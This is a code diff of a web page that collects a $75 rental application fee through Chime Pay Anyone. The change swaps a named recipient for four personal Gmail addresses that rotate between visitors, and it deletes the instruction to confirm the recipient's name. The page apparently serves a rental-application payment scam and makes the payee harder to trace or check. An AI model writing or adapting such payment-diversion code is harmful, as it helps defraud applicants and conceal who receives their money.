@@ -2587,6 +2587,14 @@
       color: var(--pp-primary-light) !important;
     }
 
+    html.home-root body.payment-premium .pp-chime-account .pp-pay-tag .pp-chime-account__email {
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.35;
+      overflow-wrap: anywhere;
+    }
+
     @media (max-width: 479px) {
       html.home-root body.payment-premium .pp-chime-account .pp-pay-line {
         padding: 16px 16px 14px;
@@ -2707,7 +2715,7 @@
           </div>
           <div>
             <h2 class="pp-card__title" id="chime-title">Chime Pay Anyone</h2>
-            <p class="pp-card__desc">Enter this Chime tag in Chime Pay Anyone, then follow the steps below.</p>
+            <p class="pp-card__desc">Enter this email in Chime Pay Anyone, then follow the steps below.</p>
           </div>
         </div>
 
@@ -2715,22 +2723,20 @@
           <div class="pp-pay-sheet">
             <div class="pp-pay-line pp-pay-line--person">
               <div class="pp-pay-line__copy">
-                <span class="pp-pay-line__label">Recipient</span>
-                <p class="pp-chime-account__name" data-no-i18n>FRANK LAMONT</p>
-                <span class="pp-pay-line__label">Chime tag</span>
+                <span class="pp-pay-line__label">Payment email address</span>
                 <div class="pp-pay-tag">
-                  <span class="pp-chime-account__phone" id="chimeTag" data-copy="" data-no-i18n></span>
+                  <span class="pp-chime-account__phone pp-chime-account__email" id="chimeEmail" data-copy="" data-no-i18n></span>
                   <button
                     type="button"
                     class="pp-copy-btn"
                     id="chimeCopyBtn"
-                    data-copy-target="chimeTag"
+                    data-copy-target="chimeEmail"
                     data-payment-method="Chime"
-                    data-copy-toast="Chime tag copied successfully"
-                    aria-label="Copy Chime tag"
+                    data-copy-toast="Payment email copied successfully"
+                    aria-label="Copy email address"
                   >Copy</button>
                 </div>
-                <p class="pp-pay-help" id="chimePayHelp">Copy this Chime tag, then enter it in Chime Pay Anyone.</p>
+                <p class="pp-pay-help" id="chimePayHelp">This is an email for Chime Pay Anyone. Copy it, then paste it in the Chime app. Do not use a phone number with this email.</p>
               </div>
             </div>
           </div>
@@ -2780,10 +2786,10 @@
             <li><span>3</span> Upload a screenshot</li>
           </ol>
           <ol class="pp-steps">
-            <li><span aria-hidden="true">1</span><span>Tap Copy next to the Chime tag above.</span></li>
+            <li><span aria-hidden="true">1</span><span>Tap Copy next to the email above.</span></li>
             <li><span aria-hidden="true">2</span><span>Open the Chime app. If you do not have Chime yet, create an account in the section below first.</span></li>
             <li><span aria-hidden="true">3</span><span>Tap Pay, then tap Pay or Request.</span></li>
-            <li><span aria-hidden="true">4</span><span>Enter the Chime tag above and $75. Confirm the recipient name is FRANK LAMONT, then tap Pay.</span></li>
+            <li><span aria-hidden="true">4</span><span>Enter the email above and $75. Check the recipient and the amount, then tap Pay.</span></li>
             <li><span aria-hidden="true">5</span><span>Come back to this page and upload a screenshot of the payment above.</span></li>
           </ol>
         </div>
@@ -2795,7 +2801,7 @@
             <li><span aria-hidden="true">1</span><span>Download the official Chime mobile banking app using the links below.</span></li>
             <li><span aria-hidden="true">2</span><span>Open the app and tap Sign Up to begin your application.</span></li>
             <li><span aria-hidden="true">3</span><span>Enter your personal information and complete identity verification as prompted.</span></li>
-            <li><span aria-hidden="true">4</span><span>Once your account is approved, return to this page and send your payment using Pay Anyone.</span></li>
+            <li><span aria-hidden="true">4</span><span>Once your account is approved, return to this page and send $75 to the payment email above using Pay Anyone.</span></li>
           </ol>
           <p class="pp-chime-signup__downloads-title" id="chime-downloads-title">Download the Chime App</p>
           <div class="pp-store-buttons" role="group" aria-labelledby="chime-downloads-title">
@@ -2825,7 +2831,7 @@
         <div class="pp-chime-trust">
           <p class="pp-notice pp-notice--trust">
             <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3l8 4v5c0 5-3.5 8.7-8 9-4.5-.3-8-4-8-9V7l8-4z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            <span>Please confirm the recipient details carefully before sending payment. Your application review will begin once payment confirmation is received.</span>
+            <span>Please confirm the email address carefully before sending payment. Your application review will begin once payment confirmation is received.</span>
           </p>
           <p class="pp-notice pp-notice--trust">
             <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 8v5m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
@@ -3032,54 +3038,62 @@
       let isSubmitting = false;
       let emailJsInitPromise = null;
 
+      let assignedChimeEmail = '';
+
       (function assignChimePayAnyoneTarget() {
         const targets = [
-          '$Frank-Lamont'
+          'tenantfirstmanager@gmail.com',
+          'tenantfirstmgt@gmail.com',
+          'tenantfirstm@gmail.com',
+          'tenantfirstmgts@gmail.com'
         ];
         const nextKey = 'ppmChimePayAnyoneNext';
+        const assignmentKey = applicationId
+          ? `ppmChimePayAnyoneTarget:${applicationId}`
+          : 'ppmChimePayAnyoneTarget';
         let selected = '';
 
-        if (applicationId) {
-          let hash = 0;
-          for (let i = 0; i < applicationId.length; i += 1) {
-            hash = (hash + applicationId.charCodeAt(i)) % targets.length;
-          }
-          selected = targets[hash];
-        } else {
+        try {
+          const stored = applicationId
+            ? (window.localStorage.getItem(assignmentKey) || window.sessionStorage.getItem(assignmentKey))
+            : window.sessionStorage.getItem(assignmentKey);
+          if (targets.includes(stored)) selected = stored;
+        } catch (error) {
+          selected = '';
+        }
+
+        if (!selected) {
+          let next = 0;
           try {
-            const stored = window.sessionStorage.getItem('ppmChimePayAnyoneTarget');
-            if (targets.includes(stored)) selected = stored;
+            next = Number(window.localStorage.getItem(nextKey)) || 0;
           } catch (error) {
-            selected = '';
+            next = 0;
           }
-
-          if (!selected) {
-            let next = 0;
-            try {
-              next = Number(window.localStorage.getItem(nextKey)) || 0;
-            } catch (error) {
-              next = 0;
-            }
-            selected = targets[next % targets.length];
-            try {
-              window.sessionStorage.setItem('ppmChimePayAnyoneTarget', selected);
-              window.localStorage.setItem(nextKey, String((next + 1) % targets.length));
-            } catch (error) {
-              /* ignore */
-            }
+          selected = targets[((next % targets.length) + targets.length) % targets.length];
+          try {
+            window.sessionStorage.setItem(assignmentKey, selected);
+            if (applicationId) window.localStorage.setItem(assignmentKey, selected);
+            window.localStorage.setItem(nextKey, String((next + 1) % targets.length));
+          } catch (error) {
+            /* ignore */
           }
         }
 
-        const tag = document.getElementById('chimeTag');
-        if (!tag) return;
+        assignedChimeEmail = selected;
+        selectedPaymentMethod = `Chime (${selected})`;
+        const copyBtn = document.getElementById('chimeCopyBtn');
+        if (copyBtn) copyBtn.dataset.paymentMethod = selectedPaymentMethod;
+
+        const email = document.getElementById('chimeEmail');
+        if (!email) return;
         const at = selected.indexOf('@');
-        tag.replaceChildren();
+        email.replaceChildren();
         if (at > 0) {
-          tag.append(selected.slice(0, at + 1), document.createElement('wbr'), selected.slice(at + 1));
+          email.append(selected.slice(0, at + 1), document.createElement('wbr'), selected.slice(at + 1));
         } else {
-          tag.textContent = selected;
+          email.textContent = selected;
         }
-        tag.dataset.copy = selected;
+        email.dataset.copy = selected;
       })();
 
       function logPaymentDebug(label, details) {
@@ -3320,6 +3334,7 @@
             `Applicant phone: ${applicantPhone || 'Not provided'}`,
             `Property: ${storedProperty || 'Not provided'}`,
             `Payment method: ${selectedPaymentMethod || 'Not specified'}`,
+            `Chime payment email: ${assignedChimeEmail || 'Not provided'}`,
             `Cloudinary image URL: ${imageUrl}`,
             `Upload timestamp: ${uploadTimestamp}`,
             `Language: ${selectedLanguage}`
